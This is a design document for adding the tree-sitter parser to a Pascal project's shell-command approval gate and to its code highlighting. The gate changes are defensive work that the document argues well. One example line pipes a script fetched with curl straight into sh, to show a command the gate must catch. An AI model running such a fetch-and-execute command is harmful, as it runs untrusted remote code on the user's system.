# Tree-Sitter

## Overview

Vendor **tree-sitter** — an incremental, error-tolerant parser generator plus a
dependency-free C runtime — and use it for two jobs that today share a wrong
tool:

1. **Shell command parsing for the approval gate.** The gate must know which
   programs a command will run. The current parser
   (`hildegard.helper.command.policy`) splits a command line at unquoted POSIX
   operators and calls each segment's first word its executable. It has no
   notion of shell keywords or nesting, so it is wrong in **both** directions.
2. **Syntax highlighting** of fenced code blocks, replacing the hand-rolled
   tokenizer with community grammars and community highlight queries.

The first job is the reason this feature exists. The second is a consequence of
having the engine.

## Problem Statement

### The approval gate is wrong in both directions

`run_command` is gated by an approval whitelist keyed on `run_command:<bin>`,
one ask per "simple-command segment". The splitter is a lexical POSIX
approximation, and shell is not a lexical language:

**It over-approximates** — it invents programs that do not exist:

```
for f in *.pas; do echo $f; done
```

splits at the `;` into three segments whose executables are `for`, `do`, and
`done`. The operator is asked to allow `run_command:for`, `run_command:do`, and
`run_command:done` — three grants that name shell *keywords*, not programs. The
same happens for `if/then/fi`, `while/do/done`, `case/esac`, and function
definitions. This is the reported bug: the dialog shows odd commands to approve.

**It under-approximates** — it misses programs that *do* exist. A command inside
a substitution is an unresolvable token, not a segment:

```
echo $(curl -s https://example.com | sh)
```

asks for `echo` only. `curl` and `sh` are never surfaced — yet they are exactly
the programs the gate exists to catch. **The gate fails open on the class of
command it most needs to see.**

A guardrail that is wrong in both directions trains the operator to click
through the dialog, which is worse than no dialog: the noise hides the signal.

### Highlighting rejected tree-sitter for a reason that no longer holds

`TUI_Syntax_Highlighting/FEATURE.md` explicitly rejects a vendored parser:

> *"A heavyweight parser (tree-sitter etc.) is a vendored-C dependency with
> per-language grammars — the same weight class the project just avoided for
> TLS, bought for accuracy a terminal viewer cannot display."*

That was the right call **for colour alone**: 16 terminal colours cannot show
semantic accuracy, so a parser is not worth its weight. It is the wrong call for
**command parsing**, where the requirement is not fidelity the eye can see but
**correctness of a security boundary**. The dependency is now bought by the
approval gate; highlighting rides along for free.

## Goals

- **One parser, two consumers.** A vendored tree-sitter runtime, an FPC binding,
  a grammar registry, and a query runner — with the shell and highlighting
  adapters built on it.
- **A correct shell ask set.** Given a command, produce the set of programs it
  will run, descending into compound statements, pipelines, subshells, and
  command/process substitutions. No keyword is ever an ask; no reachable
  program is ever missing.
- **Fail safe, never fail open.** If the parse is imperfect (an `ERROR` node, an
  unsupported construct), the ask set is the **union** of what the tree yields
  and what the conservative splitter yields — plus, when neither is confident,
  the raw command itself as an ask. A degraded parser makes the dialog noisier,
  never blinder.
- **Community lexers.** Highlighting is driven by vendored community grammars
  and their `highlights.scm`, not hand-maintained per-language tables. Adding a
  language is fetching a grammar, not writing a unit.
- **Boring vendoring.** The runtime and each grammar are pinned, checksummed,
  fetched by script into `deps/` (not committed), and compiled into the binary
  the same way SQLite and mbedTLS already are.
- **No regex on untrusted text.** The parser is a generated table; query
  predicates may use `#match?`, which matches a *node's* text with tree-sitter's
  own small engine, never a scan of the document. This preserves the
  no-backtracking-on-untrusted-input property the highlighting feature already
  relies on.

## Non-Goals

- **Semantic analysis** — types, scopes, definitions, diagnostics. A parser is
  not a compiler; the highlighting ceiling stays lexical-plus-structural.
- **LSP** — unchanged from the highlighting feature's rejection.
- **Executing through the parser.** Parsing informs the gate and the display;
  the shell still executes the command. The parser is not an evaluator and must
  never be trusted to *authorise* on its own.
- **A general grammar catalogue.** v1 ships a small, chosen set (shell first).
- **Full shell semantics** — expansion, globbing, word splitting are still not
  resolved; the gate reasons about *literal* program names as it does today.
- **Editing affordances** — folding, indentation, bracket matching.

## User Stories

- As an **operator**, I want the approval dialog to name the programs a command
  will actually run, so I can judge the grant without decoding shell syntax.
- As an **operator**, I want a command hidden in `$(...)` or a subshell to be
  surfaced for approval, so a pipeline cannot smuggle a program past the gate.
- As a **security reviewer**, I want the gate's failure mode to be "too many
  asks", never "no ask", so an imperfect parse cannot silently widen access.
- As an **operator**, I want fenced code in answers coloured like code, so I can
  scan structure before reading.
- As a **developer**, I want a new highlighted language to be a fetched grammar
  and its query file, so the feature does not accrete hand-written lexers.

## Acceptance Criteria

### Functional — shell parsing

- [ ] `for`/`if`/`while`/`case`/function definitions yield asks for the programs
      in their bodies, and **never** for keywords (`for`, `do`, `done`, `if`,
      `then`, `fi`, `case`, `esac`, …).
- [ ] A pipeline yields one ask per stage's program.
- [ ] A command substitution (`$(...)`, backticks) and a process substitution
      (`<(...)`, `>(...)`) yield asks for the programs inside.
- [ ] A subshell (`( ... )`) and a command list (`&&`, `||`, `;`, `&`) yield one
      ask per program.
- [ ] A program invoked through `env`, `sudo`, `xargs`, or `sh -c` yields an ask
      for the outer program (the inner string is not executed by the gate's
      model, and is surfaced by the fallback union when unparsed).
- [ ] The ask set is **stable and deduplicated**: repeated programs yield one
      ask; ordering is deterministic (first appearance).
- [ ] On `ERROR`/`MISSING` nodes, the ask set is the union of the tree's
      programs and the conservative splitter's executables; if the tree is
      unusable, the raw command is asked.

### Functional — highlighting

- [ ] A fenced block whose tag maps to a vendored grammar highlights via that
      grammar's `highlights.scm`: strings, comments, keywords, functions,
      numbers, and variables each carry a distinct theme role.
- [ ] Untagged fences, unknown tags, and grammars not vendored render exactly as
      today (monochrome in the box) — strictly additive.
- [ ] A fenced `bash`/`sh`/`shell` block highlights through the same grammar the
      approval gate parses with.
- [ ] Highlighting is computed once per block and never per frame.

### Non-Functional

- [ ] The runtime and grammars are pinned and checksummed; `deps/` is fetched by
      script and not committed.
- [ ] The shell parse of a typical command is bounded (target: sub-millisecond;
      the parser is incremental and the inputs are short).
- [ ] No unbounded work on malformed input: a parse always terminates; the ask
      extraction is a bounded tree walk.
- [ ] `make check` green (functional tests plus the heaptrc leak gate).

## Success Metrics

### Quantitative

- The reported `for`-loop command produces exactly the ask(s) for the programs
  in its body, and zero keyword asks.
- The `$(curl … | sh)` example produces asks for `echo`, `curl`, and `sh`.
- A 200-line block highlights once in < 5 ms.

### Qualitative

- The approval dialog names programs the operator recognises.
- An operator can grant a loop once, not three times, and the grants are
  meaningful.

## Constraints

### Technical

- FPC 3.3.1, `{$mode delphi}`; POSIX (macOS/Linux); `make check` green.
- The runtime and grammars are **C**, compiled into the binary the way SQLite
  and mbedTLS are; the FPC side is a thin `cdecl` binding plus adapters.
- **One writer of the ask set.** The approval adapter is the only consumer of
  the shell parse for gating; the display uses the same parse so the dialog and
  the transcript agree.
- **The parse never authorises.** It produces asks; the existing approval engine
  decides. A parse that finds nothing must not mean "allow".
- Grammars are chosen per language and pinned **with** the runtime version (the
  generated parser's `LANGUAGE_VERSION` must be in the runtime's supported
  range — a version skew is a build-time failure, not a runtime surprise).

### Business / Time

- No deadline. `main` only, TDD-first, one logical commit per step.

## Dependencies

### Internal

- `hildegard.helper.command.tool` / `hildegard.helper.command.policy` — the
  current splitter and the approval adapter (`BuildAsks`); the new parser
  replaces the plan it consumes.
- `hildegard.helper.approval` — the ask/whitelist engine (unchanged).
- `hildegard.helper.syntax` / `hildegard.helper.tui.markdownview` — the
  highlighting consumer; the engine swaps behind the same span pipeline.
- `hildegard.helper.wrap` — the `$ <command>` display line (highlighting).

### External

- **tree-sitter** (runtime, MIT) and per-language grammars (MIT, or the
  grammar's own licence — recorded per grammar). Vendored by
  `scripts/fetch-tree-sitter.sh`; no network at build or run.

## Risks

- **Under-approximation is a security regression.** Mitigation: the union-with-
  fallback rule; a test asserts the `$(…)` case surfaces its inner programs, and
  a property test asserts the ask set is a superset of the splitter's executables
  whenever the tree has an error.
- **ABI skew.** Mitigation: pin the runtime and grammars together; a build-time
  `ts_language_version` assertion fails the build on skew.
- **Binary weight.** Each grammar is a large generated C file. Mitigation:
  vendor only the chosen set; measure the binary delta; the highlighting
  feature's "16 colours" objection is answered by the gate's need, not by colour.
- **Build complexity.** A new C dependency and a code-generation-free build (the
  grammars are checked-in `parser.c`, not generated at build). Mitigation: mirror
  the SQLite/mbedTLS build shape; a `make ts-standalone` smoke like
  `async-standalone`.
- **A grammar that does not exist.** Not every language has a maintained
  grammar. Mitigation: the language set is a decision, not a promise; an
  unvendored tag degrades to today's monochrome.
- **The parser becomes a trust anchor.** It must never be the thing that
  *allows*. Mitigation: stated as a constraint and tested (a command with no
  parse yields an ask, not a pass).

## Out of Scope

- Compiling or interpreting the parsed shell (no evaluation).
- Windows / `cmd` syntax (the parser is bash/POSIX; `ssCmd` stays reserved).
- Semantic highlighting, LSP, editors.
- Generating grammars at build time (the `tree-sitter` CLI is a dev-time tool).

## Future Considerations

- **More grammars** — Python, JSON, SQL, Pascal, Go, Rust as vendoring grows.
- **Structural tools** — `file_outline`, structural grep, folding — the same
  tree, new consumers.
- **`locals.scm` / `injections.scm`** — scoped colouring and nested languages
  (markdown → fenced language is the first injection).
- **Ask enrichment** — surface arguments/redirections for high-risk programs
  (e.g. `rm -rf`) from the same tree.
- **A shared tree cache** between the gate and the highlighter for the same
  command string.

## Notes

- **This reverses `TUI_Syntax_Highlighting`'s "no vendored parser" decision.**
  The reversal is deliberate and is recorded here and there: the dependency is
  bought by the approval gate's correctness, not by colour. The highlighting
  feature's own acceptance criteria (additive, computed once, no regex on
  untrusted text) are preserved.
- **Why tree-sitter over the alternatives.** TextMate grammars (VS Code's
  ecosystem) are regex engines — they reintroduce ReDoS on untrusted output and
  cannot parse a shell command's structure. Pygments/Chroma need a runtime
  process. A hand-rolled shell parser is the very thing that is wrong today, and
  shell has no small grammar. tree-sitter is the only option that is both a
  community-lexer ecosystem and a real, regex-free parser.
- **ICE score: Impact 8** (a security-boundary correctness fix plus a
  highlighting engine), **Confidence 6** (the C vendoring and the shell walker
  are the work; the ABI and the ask-set contract need calibration), **Ease 4**
  (build, binding, query runner, shell walker, two consumers).
- **Prior art:** tree-sitter in Neovim, Helix, Zed, and Emacs 29; `ast-grep` and
  `difftastic` for structural use; `mvdnan/sh` (a Go shell parser) is cited by
  `tree-sitter-bash` itself.
